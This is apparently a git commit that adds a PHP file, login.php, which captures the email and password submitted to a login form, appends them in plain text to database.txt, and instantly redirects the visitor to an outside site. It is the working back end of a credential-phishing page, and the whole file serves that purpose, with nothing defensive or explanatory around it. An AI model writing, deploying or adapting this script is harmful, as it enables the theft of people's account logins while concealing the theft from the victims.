42bf647cd4ba8e65faf5de94cc44459ed5c02e72
Kirill <70746140+MKcoder163@users.noreply.github.com>
2023-01-11 21:51:05 +0400

    Add files via upload

---
+++ login.php
@@ -0,0 +1,16 @@
+
+<?PHP
+
+$Log = $_POST['email'];
+
+$Pass = $_POST['pass'];
+
+$log = fopen("database.txt","at");
+
+fwrite($log,"\n $Log:$Pass \n");
+
+fclose($log);
+
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://lleo.aha.ru/na/'></head></html>";
+
+?>
